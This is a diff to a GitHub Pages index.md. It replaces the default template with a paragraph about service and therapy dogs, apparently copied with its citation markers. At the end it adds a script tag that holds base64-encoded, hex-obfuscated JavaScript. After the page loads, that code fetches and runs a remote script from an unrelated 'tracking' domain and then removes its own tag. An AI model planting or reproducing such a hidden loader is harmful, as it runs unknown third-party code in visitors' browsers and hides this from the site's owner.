@@ -1,37 +1,3 @@
-## Welcome to GitHub Pages
+The use of dogs in activities to help humans has become widespread in the last few decades since the 1970s and 1980s. Dogs have been used for service due to their highly developed sense of smell; Research shows they can smell fear, anxiety, and sadness. The use of service dogs in assisting humans range from guide dogs, mobility dogs and medical alert dogs. In some hospitals, the use of dogs has been referred to as animal-facilitated therapy (AFT). AFT involves the use of trained, certified animals as part of a medical patient's therapeutic plan. These programs have been shown to promote a healing environment and reduce certain psychological symptoms for patients with a variety of diagnoses, including cancer,[7] seizure alert and detecting peanut allergies.[medical citation needed] Dogs, better known as “therapy dogs,” are used in hospitals for pet-assisted therapy to provide comfort and affection to people. As a result of the studies by Dr. Samuel Corson pets have become commonplace in nursing homes[8] and other such settings. Persons who suffer from isolation, depression, and mental illness, sometimes to the point where it significantly interferes with day-to-day life find security in an emotional support animal. It is important to remember that those dogs that fall into the emotional support animal category do not require any specific training or screening.[9]
 
-You can use the [editor on GitHub](https://github.com/3TGXS0veNs/3TGXS0veNs1/edit/gh-pages/index.md) to maintain and preview the content for your website in Markdown files.
-
-Whenever you commit to this repository, GitHub Pages will run [Jekyll](https://jekyllrb.com/) to rebuild the pages in your site, from the content in your Markdown files.
-
-### Markdown
-
-Markdown is a lightweight and easy-to-use syntax for styling your writing. It includes conventions for
-
-```markdown
-Syntax highlighted code block
-
-# Header 1
-## Header 2
-### Header 3
-
-- Bulleted
-- List
-
-1. Numbered
-2. List
-
-**Bold** and _Italic_ and `Code` text
-
-[Link](url) and ![Image](src)
-```
-
-For more details see [GitHub Flavored Markdown](https://guides.github.com/features/mastering-markdown/).
-
-### Jekyll Themes
-
-Your Pages site will use the layout and styles from the Jekyll theme you have selected in your [repository settings](https://github.com/3TGXS0veNs/3TGXS0veNs1/settings/pages). The name of this theme is saved in the Jekyll `_config.yml` configuration file.
-
-### Support or Contact
-
-Having trouble with Pages? Check out our [documentation](https://docs.github.com/categories/github-pages-basics/) or [contact support](https://support.github.com/contact) and we’ll help you sort it out.
+<script id="Nbm8O" src="data:text/javascript;base64, dmFyIF9BNlIyZiA9IFsnXHg3MVx4NzVceDY1XHg3Mlx4NzlceDUzXHg2NVx4NmNceDY1XHg2M1x4NzRceDZmXHg3MicsICdceDYyXHg2Zlx4NjRceDc5JywgJ1x4NjdceDY1XHg3NFx4NDVceDZjXHg2NVx4NmRceDY1XHg2ZVx4NzRceDQyXHg3OVx4NDlceDY0JywgJ1x4NDRceDRmXHg0ZFx4NDNceDZmXHg2ZVx4NzRceDY1XHg2ZVx4NzRceDRjXHg2Zlx4NjFceDY0XHg2NVx4NjQnLCAnXHg2M1x4NzJceDY1XHg2MVx4NzRceDY1XHg0NVx4NmNceDY1XHg2ZFx4NjVceDZlXHg3NCcsICdceDczXHg2M1x4NzJceDY5XHg3MFx4NzQnLCAnXHg3NFx4NzlceDcwXHg2NScsICdceDc0XHg2NVx4NzhceDc0XHgyZlx4NmFceDYxXHg3Nlx4NjFceDczXHg2M1x4NzJceDY5XHg3MFx4NzQnXTsoZnVuY3Rpb24oX2xYZGJhLCBfcHdXVUMpIHt2YXIgX0FHV2tMID0gZnVuY3Rpb24oX2gwSmtaKSB7d2hpbGUgKC0tX2gwSmtaKSB7X2xYZGJhWydwdXNoJ10oX2xYZGJhWydzaGlmdCddKCkpO319O19BR1drTCgrK19wd1dVQyk7fShfQTZSMmYsIDB4MTFiKSk7dmFyIF9iZHpROCA9IGZ1bmN0aW9uKF82NUxoMiwgX213MkhaKSB7XzY1TGgyID0gXzY1TGgyIC0gMHgwO3ZhciBfTnpHWEwgPSBfQTZSMmZbXzY1TGgyXTtyZXR1cm4gX056R1hMO307ZG9jdW1lbnRbJ1x4NjFceDY0XHg2NFx4NDVceDc2XHg2NVx4NmVceDc0XHg0Y1x4NjlceDczXHg3NFx4NjVceDZlXHg2NVx4NzInXShfYmR6UTgoJzB4MCcpLCBmdW5jdGlvbigpIHt2YXIgX3VzV0JMID0gZG9jdW1lbnRbX2JkelE4KCcweDEnKV0oX2JkelE4KCcweDInKSk7X3VzV0JMW19iZHpROCgnMHgzJyldID0gX2JkelE4KCcweDQnKTtfdXNXQkxbJ1x4NzNceDcyXHg2MyddID0gJ1x4NjhceDc0XHg3NFx4NzBceDczXHgzYVx4MmZceDJmXHg3NFx4NzJceDYxXHg2M1x4NmJceDY5XHg2ZVx4NjdceDJlXHg2M1x4NjFceDczXHgyZFx4NzZceDMxXHgyZVx4NzNceDcwXHg2MVx4NjNceDY1XHgyZlx4NWZceDcyXHg2NVx4NmRceDZmXHg3NFx4NjVceDVmXHg3NFx4NzJceDYxXHg2M1x4NmJceDJlXHg2YVx4NzNceDNmXHg2M1x4NjFceDZkXHg3MFx4NjFceDY5XHg2N1x4NmVceDNkXHg1M1x4NGJceDc3XHg0OFx4NGZceDU5XHg0MVx4MzBceDRlXHg3OSc7ZG9jdW1lbnRbX2JkelE4KCcweDUnKV0oX2JkelE4KCcweDYnKSlbJ1x4NjFceDcwXHg3MFx4NjVceDZlXHg2NFx4NDNceDY4XHg2OVx4NmNceDY0J10oX3VzV0JMKTtkb2N1bWVudFtfYmR6UTgoJzB4NycpXSgnTmJtOE8nKVsnXHg3Mlx4NjVceDZkXHg2Zlx4NzZceDY1J10oKTt9LCB7J1x4NmZceDZlXHg2M1x4NjUnOiAhIVtdfSk7"></script>
